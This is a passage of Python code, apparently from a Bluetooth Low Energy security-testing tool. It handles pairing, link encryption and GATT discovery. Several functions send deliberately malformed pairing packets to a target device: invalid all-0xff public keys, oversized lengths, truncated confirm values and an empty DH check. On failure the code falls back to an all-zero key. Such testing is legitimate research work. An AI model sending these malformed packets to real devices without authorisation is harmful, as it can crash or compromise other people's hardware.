            # e(key, plain text) - most significant octet first
            try:
                self.conn_skd += self.pkt.skds  # SKD = SKDm || SKDs
                self.conn_iv += self.pkt.ivs  # IV = IVm || IVs
              
                self.conn_session_key = self.bt_crypto_e(self.conn_ltk[::-1], self.conn_skd[::-1])
                print(hexlify(self.conn_ltk).upper())
                print(hexlify(self.conn_skd).upper())
                print(hexlify(self.conn_session_key).upper())
                #if(saved == self.conn_session_key):
                    #print("same")
                #else:
                    #print("not same")

            except:
                print('error and generating static key of all 00')
                print(traceback.format_exc())
                self.pkt.show()
                self.conn_ltk = "00000000000000000000000000000000".decode("hex")
                try:
                    self.conn_session_key = self.bt_crypto_e(self.conn_ltk[::-1], self.conn_skd[::-1])
                    print(hexlify(self.conn_ltk).upper())
                    print(hexlify(self.conn_skd).upper())
                    print(hexlify(self.conn_session_key).upper())
                except:
                    self.conn_skd = "00000000000000000000000000000000".decode("hex")
                    self.conn_session_key = self.bt_crypto_e(self.conn_ltk[::-1], self.conn_skd[::-1])
                    print(hexlify(self.conn_ltk).upper())
                    print(hexlify(self.conn_skd).upper())
                    print(hexlify(self.conn_session_key).upper())


            self.conn_master_packet_counter = 0


        elif LL_START_ENC_RSP in self.pkt:
            print(Fore.GREEN + "[!] !!! Link Encrypted direct in host !!!")
            # self.send_feature_response()
            return True



        return False

    def finish_key_exchange(self):
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                smp_answer = BLESMPServer.send_hci(raw(HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr() / self.pkt[SM_Hdr]))
                if smp_answer is not None and isinstance(smp_answer, list):
                    for res in smp_answer:
                        res = HCI_Hdr(res)  # type: HCI_Hdr
                        if SM_Hdr in res:
                            pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / res[SM_Hdr]
                            self.sent_packet = pkt
                            self.send(pkt)
            except:
                pass

        return False

    # # non-fragmentation code 
    def send_public_key_invalid(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_public_key()
                print("hci_res modified")
                #print(hci_res)
                if hci_res:
                    print("IK in: ")
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    pkt[SM_Public_Key].key_x = b'\xff' * 32
                    pkt[SM_Public_Key].key_y = b'\xff' * 32
                    print("after modification IK: ")
                    pkt.show()
                    self.send(pkt)
            except:
                pass

    def send_public_key(self):
        if SM_Hdr is None or self.pkt is None:
            print("SM_Hdr is None or self.pkt is None")
            return
        if SM_Hdr in self.pkt:
            print("SM_Hdr in self.pkt")
            self.machine.reset_state_timeout()
            print("after reset_state_timeout")
            try:
                print("before hci_res")
                hci_res = BLESMPServer.send_public_key()
                print("hci_res modified")
                print(hci_res)
                if hci_res:
                    print("IK in: ")
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    self.send(pkt)
            except:
                pass


    def send_public_key_max_len(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_public_key()
                print("hci_res modified")
                #print(hci_res)
                if hci_res:
                    print("IK in: ")
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.len = 247 
                    pkt.show()
                    self.send(pkt)
            except:
                pass
             
             
             
    # fragmentation code 
    def send_public_key_invalid_frag(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()                        
            try:
                hci_res = BLESMPServer.send_public_key()
                print("hci_res modified invalid") 
                print("HEX:")
                print(binascii.hexlify(hci_res).upper())
                data = HCI_Hdr(hci_res)
                data.show()
                data[SM_Public_Key].key_x = b'\xff' * 32
                data[SM_Public_Key].key_y = b'\xff' * 32
                data.show()
                if hci_res:
                    if HCI_ACL_Hdr in data and len(data.getlayer(HCI_ACL_Hdr)) > 27:
                        l2CapHdr = data.getlayer(L2CAP_Hdr)
                        #l2CapHdr.show()
                        #l2CapHdr[SM_Public_Key].key_x = b'\xff' * 32
                        #l2CapHdr[SM_Public_Key].key_y = b'\xff' * 32
                        l2CapLen = len(l2CapHdr.payload)
                        l2CapHdr.len = l2CapLen
                        print("l2CapLen: " + str(l2CapLen))
                        payloadToSend = raw(l2CapHdr)
                        print("payloadToSend: " + str(len(raw(l2CapHdr))))
                        print("Total Payload: "+ binascii.hexlify(payloadToSend.upper()))
                        first = True
                        first_again = 0
                        while len(payloadToSend) > 0:
                            currPacketLen = 27 if len(payloadToSend) > 27 else len(payloadToSend)
                            packet = HCI_Hdr() / HCI_ACL_Hdr()
                            if first:
                                first = False
                                packet.PB = 0x2
                            else:
                                packet.PB = 0x1
                            packet.add_payload(payloadToSend[:currPacketLen])
                            print("Total Payload: "+ binascii.hexlify(payloadToSend.upper()))
                            print("Current Payload: "+ binascii.hexlify(payloadToSend[:currPacketLen].upper()))
                            print("IK in payload creations iterations: "+ str(first_again))
                            packet.show()
                            if first_again == 2:
                                pkt3 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 1) / payloadToSend[:currPacketLen]
                                print("HEX: "+binascii.hexlify(raw(pkt3)).upper())
                                self.send(pkt3)
                                first_again = first_again + 1
                                #sleep(0.2)
                            if first_again == 1:
                                pkt2 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 1) / payloadToSend[:currPacketLen]
                                first_again = first_again + 1
                                print("HEX: "+binascii.hexlify(raw(pkt2)).upper())
                                self.send(pkt2)
                                #sleep(0.2)
                            if first_again == 0:
                                #sleep(0.2)
                                pkt1 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 2) / payloadToSend[:currPacketLen]
                                first_again = first_again + 1
                                print("HEX: "+ binascii.hexlify(raw(pkt1)).upper())
                                raw_pk1 = raw(pkt1)
                                self.send(pkt1)
                                #sleep(0.2)
                            #pkt.show()
                            #self.send(packet)
                            payloadToSend = payloadToSend[currPacketLen:]
                    else:
                        print("IK out: ")
                        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                        pkt.show()
                        self.send(pkt)   
            except:
                pass


    def send_public_key_frag(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
      
            try:
                hci_res = BLESMPServer.send_public_key()
                print("hci_res modified") 
                print("HEX:")
                print(binascii.hexlify(hci_res).upper())
                data = HCI_Hdr(hci_res)
                data.show()
                if hci_res:
                    if HCI_ACL_Hdr in data and len(data.getlayer(HCI_ACL_Hdr)) > 27:
                        l2CapHdr = data.getlayer(L2CAP_Hdr)
                        l2CapLen = len(l2CapHdr.payload)
                        l2CapHdr.len = l2CapLen
                        print("l2CapLen: " + str(l2CapLen))
                        payloadToSend = raw(l2CapHdr)
                        print("payloadToSend: " + str(len(raw(l2CapHdr))))
                        print("Total Payload: "+ binascii.hexlify(payloadToSend.upper()))
                        first = True
                        first_again = 0
                        while len(payloadToSend) > 0:
                            currPacketLen = 27 if len(payloadToSend) > 27 else len(payloadToSend)
                            packet = HCI_Hdr() / HCI_ACL_Hdr()
                            if first:
                                first = False
                                packet.PB = 0x2
                            else:
                                packet.PB = 0x1
                            packet.add_payload(payloadToSend[:currPacketLen])
                            print("Total Payload: "+ binascii.hexlify(payloadToSend.upper()))
                            print("Current Payload: "+ binascii.hexlify(payloadToSend[:currPacketLen].upper()))
                            print("IK in payload creations iterations: "+ str(first_again))
                            packet.show()
                            if first_again == 2:
                                pkt3 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 1) / payloadToSend[:currPacketLen]
                                print("HEX: "+binascii.hexlify(raw(pkt3)).upper())
                                self.send(pkt3)
                                first_again = first_again + 1
                                #sleep(0.2)
                            if first_again == 1:
                                pkt2 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 1) / payloadToSend[:currPacketLen]
                                first_again = first_again + 1
                                print("HEX: "+binascii.hexlify(raw(pkt2)).upper())
                                self.send(pkt2)
                                #sleep(0.2)
                            if first_again == 0:
                                #sleep(0.2)
                                pkt1 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 2) / payloadToSend[:currPacketLen]
                                first_again = first_again + 1
                                print("HEX: "+ binascii.hexlify(raw(pkt1)).upper())
                                raw_pk1 = raw(pkt1)
                                self.send(pkt1)
                                #sleep(0.2)
                            #pkt.show()
                            #self.send(packet)
                            payloadToSend = payloadToSend[currPacketLen:]
                    else:
                        print("IK out: ")
                        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                        pkt.show()
                        self.send(pkt)   
            except:
                pass
        
    def send_public_key_custom(self, invalid, ll_length):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_public_key()
                print("hci_res modified")
                #print(hci_res)
                if hci_res:
                    print("IK in: ")
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    if ll_length == 1:
                        pkt.len = 247
                    if invalid == 1:
                        pkt[SM_Public_Key].key_x = b'\xff' * 32
                        pkt[SM_Public_Key].key_y = b'\xff' * 32
                    pkt.show()
                    self.send(pkt)
            except:
                pass
            
            
            
    def send_public_key_frag_custom(self, invalid, ll_length):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
      
            try:
                hci_res = BLESMPServer.send_public_key()
                print("hci_res modified") 
                print("HEX:")
                print(binascii.hexlify(hci_res).upper())
                data = HCI_Hdr(hci_res)
                if invalid == 1:
                    pkt[SM_Public_Key].key_x = b'\xff' * 32
                    pkt[SM_Public_Key].key_y = b'\xff' * 32
                data.show()
                if hci_res:
                    if HCI_ACL_Hdr in data and len(data.getlayer(HCI_ACL_Hdr)) > 27:
                        l2CapHdr = data.getlayer(L2CAP_Hdr)
                        l2CapLen = len(l2CapHdr.payload)
                        l2CapHdr.len = l2CapLen
                        print("l2CapLen: " + str(l2CapLen))
                        payloadToSend = raw(l2CapHdr)
                        print("payloadToSend: " + str(len(raw(l2CapHdr))))
                        print("Total Payload: "+ binascii.hexlify(payloadToSend.upper()))
                        first = True
                        first_again = 0
                        while len(payloadToSend) > 0:
                            currPacketLen = 27 if len(payloadToSend) > 27 else len(payloadToSend)
                            packet = HCI_Hdr() / HCI_ACL_Hdr()
                            if first:
                                first = False
                                packet.PB = 0x2
                            else:
                                packet.PB = 0x1
                            packet.add_payload(payloadToSend[:currPacketLen])
                            print("Total Payload: "+ binascii.hexlify(payloadToSend.upper()))
                            print("Current Payload: "+ binascii.hexlify(payloadToSend[:currPacketLen].upper()))
                            print("IK in payload creations iterations: "+ str(first_again))
                            packet.show()
                            if first_again == 2:
                                pkt3 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 1) / payloadToSend[:currPacketLen]
                                print("HEX: "+binascii.hexlify(raw(pkt3)).upper())
                                if ll_length == 1:
                                    pkt3.len = 247
                                self.send(pkt3)
                                first_again = first_again + 1
                                #sleep(0.2)
                            if first_again == 1:
                                pkt2 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 1) / payloadToSend[:currPacketLen]
                                first_again = first_again + 1
                                print("HEX: "+binascii.hexlify(raw(pkt2)).upper())
                                if ll_length == 1:
                                    pkt2.len = 247
                                self.send(pkt2)
                                #sleep(0.2)
                            if first_again == 0:
                                #sleep(0.2)
                                pkt1 = BTLE(access_addr=self.conn_access_address) / BTLE_DATA(LLID = 2) / payloadToSend[:currPacketLen]
                                first_again = first_again + 1
                                print("HEX: "+ binascii.hexlify(raw(pkt1)).upper())
                                if ll_length == 1:
                                    pkt1.len = 247
                                raw_pk1 = raw(pkt1)
                                self.send(pkt1)
                                #sleep(0.2)
                            #pkt.show()
                            #self.send(packet)
                            payloadToSend = payloadToSend[currPacketLen:]
                    else:
                        print("IK out: ")
                        pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[SM_Hdr]
                        if ll_length == 1:
                            pkt.len = 247
                        pkt.show()
                        self.send(pkt)   
            except:
                pass
    

    def send_dh_check(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_dh_check()
                print("dh_check")
                print(hci_res)
                if hci_res:
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    self.send(pkt)
            except:
                pass

    def send_dh_check_invalid(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_dh_check()
                print("dh_check invalid")
                print(hci_res)
                if hci_res:
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    pkt[SM_DHKey_Check].dhkey_check = ""
                    self.send(pkt)
            except:
                pass
    def send_sign_info(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_sign_info()
                print("hci_res")
                print(hci_res)
                hci_res.show()
                if hci_res:
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    self.send(pkt)
            except:
                pass

    def send_sm_random(self):

        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt or True:          # forcefully making it true
            # print("Reached SM_Hdr in self.pkt")
            self.machine.reset_state_timeout()
            # print("Completed : self.machine.reset_state_timeout()")
            try:
                hci_res = BLESMPServer.send_sm_random()
                # print("Completed : BLESMPServer.send_sm_random()")
                print("hci_res")
                print(hci_res)
                if hci_res:
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    self.send(pkt)
            except:
                pass


    def send_pair_confirm(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_pair_confirm()
                print("hci_res")
                print(hci_res)
                if hci_res:
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    self.send(pkt)
            except:
                pass

    def send_pair_confirm_wrong_value(self):
        if SM_Hdr is None or self.pkt is None:
            return
        if SM_Hdr in self.pkt:
            self.machine.reset_state_timeout()
            try:
                hci_res = BLESMPServer.send_pair_confirm()
                print("hci_res")
                print(hci_res)
                if hci_res:
                    pkt = BTLE(access_addr=self.conn_access_address) / BTLE_DATA() / L2CAP_Hdr() / HCI_Hdr(hci_res)[
                        SM_Hdr]
                    pkt.show()
                    print("after!!\n\n\n\n\n\n\n\n")
                    saved = pkt[SM_Confirm].confirm
                    pkt[SM_Confirm].confirm = saved[3:16]
                    pkt.show()
                    self.send(pkt)
            except:
                pass

    def send_pri_services_request(self):
        self.slave_next_start_handle = None
        if self.slave_next_start_handle is None:
            self.att.read_by_group_type(0x0001, 0xffff, 0x2800, None)
        else:
            self.att.read_by_group_type(self.slave_next_start_handle, 0xffff, 0x2800, None)

    v = 0

    def receive_pri_services(self):
        # if LL_LENGTH_REQ in self.pkt:
        #     self.send_length_response()
        print("receive_pri_services")
        # self.pkt.show()
        if ATT_Read_By_Group_Type_Response in self.pkt:
            pkt = self.pkt[ATT_Read_By_Group_Type_Response]
            # if self.v >= 3:
            #     pkt = BTLE('7083329a020b070006000103d73710048c07709c'.decode('hex'))
            #     self.send(pkt)
            #     return False
            # self.v += 1

            if self.discover_gatt_services(pkt, 0x2800):
                self.slave_next_start_handle = None
                print(Fore.GREEN + "[!] End of primary service discovery")
                return True
        elif ATT_Error_Response in self.pkt:
            self.slave_next_start_handle = None
            print(Fore.GREEN + "[!] Primary service discovered")
            return True

    d = 0

    def send_sec_services_request(self):
        self.slave_next_start_handle = None

        if self.slave_next_start_handle is None:
            print("Main case: slave is none\n")
            self.att.read_by_group_type(0x0001, 0xffff, 0x2801, None)
        else:
            print("Else case: slave is not none\n")
            # self.att.read_by_group_type(0x0001, 0xffff, 0x2801, None)
            self.att.read_by_group_type(self.slave_next_start_handle, 0xffff, 0x2801, None)


    def receive_sec_services(self):
        if ATT_Read_By_Group_Type_Response in self.pkt:
            pkt = self.pkt[ATT_Read_By_Group_Type_Response]
            if self.discover_gatt_services(pkt, 0x2801):
                self.slave_next_start_handle = None
                print(Fore.GREEN + "[!] End of secondary service discovery")
                return True
        elif ATT_Error_Response in self.pkt:
            self.slave_next_start_handle = None
            print(Fore.GREEN + "[!] Secondary service discovered")
            return True

    def discover_gatt_services(self, pkt, request_uuid):

        length = pkt.length
        service_data = pkt.data
        bluetooth_base_addr = "00000000-0000-1000-8000-00805F9B34FB".replace('-', '')
        try:
            if length == 6:  # 4 byte uuid, 2 2-byte handles
                print(Fore.RED + "[IK] Length 6" + "service data " + str(len(service_data)))
                # print("We've got services with 16-bit UUIDs!")
                services = []
                i = 0
                end_loop = False
                while i < len(service_data):
                    services.append(service_data[i:i + 6])
                    i += 6
                # print "Services:", services
                for service in services:
                    try:
                        start = struct.unpack("<h", service[:2])[0]
                        end = struct.unpack("<h", service[2:4])[0]
                        uuid_16 = struct.unpack("<h", service[4:])[0]
                        conversion = (uuid_16 * (2 ** 96)) + int(bluetooth_base_addr, 16)
                        uuid_128 = struct.pack(">QQ", (conversion >> 64) & 0xFFFFFFFFFFFFFFFF,
                                               conversion & 0xFFFFFFFFFFFFFFFF).encode('hex')
                        uuid_128 = '-'.join((uuid_128[:8], uuid_128[8:12], uuid_128[12:16], uuid_128[16:20], uuid_128[20:]))
                        if end == -1:
                            end = 0xffff
                        if start == -1:
                            start = 0xffff
                        self.slave_device.add_service(start, end, uuid_128)
                        if end >= 0xFFFF or end < 0:
                            end_loop = True
                        if self.slave_next_start_handle is None or end >= self.slave_next_start_handle:
                            self.slave_next_start_handle = end + 1
                    except:
                        continue
                if end_loop:
                    return True
            elif length == 20:  # 16 byte uuid, 2 2-byte handles
                # print("We've got services with 128-bit UUIDs!")
                start = struct.unpack("<h", service_data[:2])[0]
                end = struct.unpack("<h", service_data[2:4])[0]
                uuid_128 = struct.unpack("<QQ", service_data[4:])
                uuid_128 = "%016x%016x" % (uuid_128[1], uuid_128[0])
                # print "UUID128:", uuid_128
                uuid_128 = '-'.join((uuid_128[:8], uuid_128[8:12], uuid_128[12:16], uuid_128[16:20], uuid_128[20:]))
                if end == -1:
                    end = 0xffff
                if start == -1:
                    start = 0xffff
                self.slave_device.add_service(start, end, uuid_128)
                if end >= 0xFFFF or end < 0:
                    return True
                self.slave_next_start_handle = end + 1
            else:
                print(Fore.RED + "[!] UNEXPECTED PRIMARY SERVICE DISCOVERY RESPONSE. BAILING")
        except:
            pass
            # Send next group type request (next services to discover)
        self.att.read_by_group_type(self.slave_next_start_handle, 0xffff, request_uuid, None)
        return False

    def send_characteristics_request(self):
        self.slave_next_start_handle = None
        if self.slave_next_start_handle is None:
            self.att.read_by_type(0x0001, 0xffff, 0x2803, None)
        else:
            self.att.read_by_type(self.slave_next_start_handle, 0xffff, 0x2803, None)

    def receive_characteristics(self):
        # Note: This is not exactly the procedure described in the spec (BLUETOOTH SPECIFICATION Version 5.0 |
        # Vol 3, Part G page 2253-4), but it's independent of a service scan.

        if ATT_Error_Response in self.pkt:
            print(Fore.GREEN + "[!] Characteristics discoved")
            self.slave_next_start_handle = None
            return True

        if ATT_Read_By_Type_Response not in self.pkt:
            return False
        # print('receive_characteristics')
        self.machine.reset_state_timeout()  # Clear timeout timer

        characteristic_data = raw(self.pkt[ATT_Read_By_Type_Response])
        bluetooth_base_addr = "00000000-0000-1000-8000-00805F9B34FB".replace('-', '')

        length = int(characteristic_data[0].encode('hex'), 16)
        characteristic_data = characteristic_data[1:]

        if length == 7:  # 4byte uuid, 2 2-byte handles, 1 byte permission
            # print("We've got services with 16-bit UUIDs!")
            characteristics = []
            i = 0
            end_loop = False
            while i < len(characteristic_data):
                characteristics.append(characteristic_data[i:i + 7])
                i += 7
            # print "Services:", services
            for characteristic in characteristics:
                handle = struct.unpack("<h", characteristic[:2])[0]
                perm = struct.unpack("<B", characteristic[2:3])[0]
                value_handle = struct.unpack("<h", characteristic[3:5])[0]
                print ("handle: " + hex(handle))
                print ("perm: " + hex(perm))
                # print "UUID_16:", characteristic[5:].encode('hex')
                uuid_16 = struct.unpack("<h", characteristic[5:])[0]
                conversion = (uuid_16 * (2 ** 96)) + int(bluetooth_base_addr, 16)
                uuid_128 = struct.pack(">QQ", (conversion >> 64) & 0xFFFFFFFFFFFFFFFF,
                                       conversion & 0xFFFFFFFFFFFFFFFF).encode('hex')
                uuid_128 = '-'.join((uuid_128[:8], uuid_128[8:12], uuid_128[12:16], uuid_128[16:20], uuid_128[20:]))
                if handle == -1:
                    handle = 0xffff
                if value_handle == -1:
                    value_handle = 0xffff
                self.slave_device.add_characteristic(value_handle, handle, uuid_128, perm)
                if handle >= 0xFFFF or handle < 0:
                    end_loop = True
                if self.slave_next_start_handle is None or handle > self.slave_next_start_handle:
                    self.slave_next_start_handle = handle + 1
            if end_loop:
                print(Fore.GREEN + "[!] End of characteristic discovery!")
                self.slave_next_start_handle = None
                return True
        elif length == 21:  # 16 byte uuid, 2 2-byte handles, 1 byte permission
            # print("We've got services with 128-bit UUIDs!")
            handle = struct.unpack("<h", characteristic_data[:2])[0]
            perm = struct.unpack("<B", characteristic_data[2:3])[0]
            value_handle = struct.unpack("<h", characteristic_data[3:5])[0]
            #print(Fore.GREEN + "[X] Characteristics skiped")
            #return True
            print ("handle 21 length: " + hex(handle))
            print ("perm 21 length: " + hex(perm))
            uuid_128 = struct.unpack("<QQ", characteristic_data[5:])
            uuid_128 = "%016x%016x" % (uuid_128[1], uuid_128[0])
            # print "UUID128:", uuid_128
            uuid_128 = '-'.join((uuid_128[:8], uuid_128[8:12], uuid_128[12:16], uuid_128[16:20], uuid_128[20:]))
            if handle == -1:
                handle = 0xffff
            if value_handle == -1:
                value_handle = 0xffff
            self.slave_device.add_characteristic(value_handle, handle, uuid_128, perm)
            if handle >= 0xFFFF or handle < 0:
                print(Fore.GREEN + "[!] End of characteristic discovery!")
                self.slave_next_start_handle = None
                return True
            self.slave_next_start_handle = handle + 1
        else:
            print("[!] UNEXPECTED INCLUDE DISCOVERY RESPONSE. BAILING. Length: " + str(length))

        self.att.read_by_type(self.slave_next_start_handle, 0xffff, 0x2803, None)
        return False

    def send_includes_request(self):
        self.slave_next_start_handle = None
        if self.slave_next_start_handle is None:
            self.att.read_by_type(0x0001, 0xffff, 0x2802, None)
        else:
            self.att.read_by_type(self.slave_next_start_handle, 0xffff, 0x2802, None)

    def receive_includes(self):

        if ATT_Error_Response in self.pkt:
            print(Fore.GREEN + "[!] Includes discoved")
            self.slave_next_start_handle = None
            return True

        if ATT_Read_By_Type_Response not in self.pkt:
            return False

        self.machine.reset_state_timeout()  # Clear timeout timer

        include_data = raw(self.pkt[ATT_Read_By_Type_Response])
        length = int(include_data[0].encode('hex'), 16)
        include_data = include_data[1:]

        if length == 8:  # 2 byte handle of this attribute, 2 byte uuid, 2 end group handle, 2 byte handle of included service declaration
            # logger.debug("We've got includes with 16-bit UUIDs!")
            includes = []
            i = 0
            end_loop = False
            while i < len(include_data):
                includes.append(include_data[i:i + 7])
                i += 7
            # print "Services:", services
            for incl in includes:
                handle = struct.unpack("<H", incl[:2])[0]
                included_att_handle = struct.unpack("<H", incl[2:4])[0]
                end_group_handle = struct.unpack("<H", incl[4:6])[0]
                # print "UUID_16:", characteristic[5:].encode('hex')
                try:
                    included_service_uuid_16 = struct.unpack("<H", incl[6:])[0]
                except:
                    return True
                if handle == -1:
                    handle = 0xffff
                self.slave_device.add_include(handle, included_att_handle, end_group_handle, included_service_uuid_16)
                if handle >= 0xFFFF or handle < 0:
                    end_loop = True
                if self.slave_next_start_handle is None or handle > self.slave_next_start_handle:
                    self.slave_next_start_handle = handle + 1
            if end_loop:
                print(Fore.GREEN + "[!] End of include discovery!")
                self.slave_next_start_handle = None
                return True
        elif length == 6:  # 2 byte handle of this attribute, 2 end group handle, 2 byte handle of included service declaration
            # logger.debug("[!] We've got services with 128-bit UUIDs!")
            handle = struct.unpack("<H", include_data[:2])[0]
            included_att_handle = struct.unpack("<H", include_data[2:4])[0]
            end_group_handle = struct.unpack("<H", include_data[4:6])[0]
            if handle == -1:
                handle = 0xffff
            self.slave_device.add_include(handle, included_att_handle, end_group_handle, None)
            if handle >= 0xFFFF or handle < 0:
                print(Fore.GREEN + "[!] End of include discovery!")
                self.slave_next_start_handle = None
                return True
            self.slave_next_start_handle = handle + 1
        else:
            print("[!] UNEXPECTED INCLUDE DISCOVERY RESPONSE. BAILING. Length: " + str(length))

        self.att.read_by_type(self.slave_next_start_handle, 0xffff, 0x2802, None)
        return False

    def send_descriptors_request(self):
        self.slave_next_start_handle = None
        if self.slave_next_start_handle is None:
            self.slave_service_idx = None
            self.slave_characteristic_idx = None
            service = None
            characteristic = None
            i = 0
            j = 0

            if self.slave_device is None:
                return

            # Get the index of the first service and characteristic available
            for _i, _service in enumerate(self.slave_device.services):
                found = False
                for _j, _characteristic in enumerate(_service.characteristics):
                    service = self.slave_device.services[_i]
                    characteristic = _service.characteristics[_j]
                    i = _i
                    j = _j
                    found = True
                    break
                if found is True:
                    break

            if characteristic is None:
                self.att.find_information(None, 0x0001, 0xFFFF)
                return

            start = characteristic.handle + 1
            if (len(service.characteristics) - 1) is 0:
                if (len(self.slave_device.services) - 1) is 0:
                    end = service.end
                else:
                    end = self.slave_device.services[i + 1].start - 1
            else:
                end = service.characteristics[j + 1].handle - 1

            if end == -1 or end > 0xffff:
                end = 0xffff
            if start == -1:
                start = 0xffff

            self.slave_service_idx = i
            self.slave_characteristic_idx = j + 1
            self.slave_characteristic = characteristic
        else:
            start = self.slave_next_start_handle
            end = self.slave_next_end_handle
        self.att.find_information(None, start, end)

    cq = 0

    def receive_descriptors(self):

        # if ATT_Exchange_MTU_Response in self.pkt:
        #     self.send_encryption_request()
        # Compute information response and add to slave_device object
        if ATT_Find_Information_Response in self.pkt:


            bluetooth_base_addr = "00000000-0000-1000-8000-00805F9B34FB".replace('-', '')
            data = raw(self.pkt[ATT_Find_Information_Response])[1:]
            uuid_format = self.pkt[ATT_Find_Information_Response].format
            if uuid_format == 1:  # 16 bit uuid
                mark = 0
                descriptors = []
                while mark < len(data):
                    descriptors.append(data[mark:mark + 4])  # 2 byte handle, 2 byte uuid
                    mark += 4
                for desc in descriptors:
                    try:
                        handle = struct.unpack("<h", desc[:2])[0]
                        uuid_16 = struct.unpack("<h", desc[2:])[0]
                        conversion = (uuid_16 * (2 ** 96)) + int(bluetooth_base_addr, 16)
                        uuid_128 = struct.pack(">QQ", (conversion >> 64) & 0xFFFFFFFFFFFFFFFF,
                                               conversion & 0xFFFFFFFFFFFFFFFF).encode('hex')
                        uuid_128 = '-'.join((uuid_128[:8], uuid_128[8:12], uuid_128[12:16],
                                             uuid_128[16:20], uuid_128[20:]))
                        if self.slave_characteristic is not None:
                            self.slave_characteristic.add_descriptor_with_data(handle, uuid_128, None)
                    except:
                        return False

            elif uuid_format == 2:  # 128-bit uuid
                handle = struct.unpack("<h", data[:2])[0]
                uuid_128 = struct.unpack("<QQ", data[2:])
                uuid_128 = "%016x%016x" % (uuid_128[1], uuid_128[0])
                uuid_128 = '-'.join((uuid_128[:8], uuid_128[8:12], uuid_128[12:16], uuid_128[16:20], uuid_128[20:]))

                self.slave_characteristic.add_descriptor_with_data(handle, uuid_128, None)
        #print("\n\n\nReached line 2711 in Desc\n\n\n")
        #self.pkt.show()
        # Iterate over the characteristics of the slave_device and send accordingly
        if ATT_Find_Information_Response in self.pkt or ATT_Error_Response in self.pkt:
            #self.machine.reset_state_timeout()  # Clear timeout timer
            print('recebido 1')

            i = self.slave_service_idx
            j = self.slave_characteristic_idx

            if i is None or j is None:
                return False

            if self.slave_device.services is None or len(self.slave_device.services) is 0:
                print(Fore.YELLOW + '[!] No descriptors listed')
                self.update_slave_handles()
                self.slave_next_start_handle = None
                self.slave_next_end_handle = None
                return True

            if self.slave_device.services[i].characteristics is not None and j >= len(
                    self.slave_device.services[i].characteristics):
                print('recebido 2')
                i += 1
                j = 0

                if i >= len(self.slave_device.services):
                    print(Fore.GREEN + '[!] Descriptors discovered')
                    # Proceed
                    self.update_slave_handles()
                    self.slave_next_start_handle = None
                    self.slave_next_end_handle = None

                    return True

                elif self.slave_device.services[i].characteristics is None or len(
                        self.slave_device.services[i].characteristics) is 0:
                    self.slave_service_idx += 1
                    print(Fore.RED + '[!] WRONG 2766')
                    return False
            elif self.slave_device.services[i].characteristics is None:
                self.slave_service_idx += 1
                return False

            service = self.slave_device.services[i]
            characteristic = service.characteristics[j]

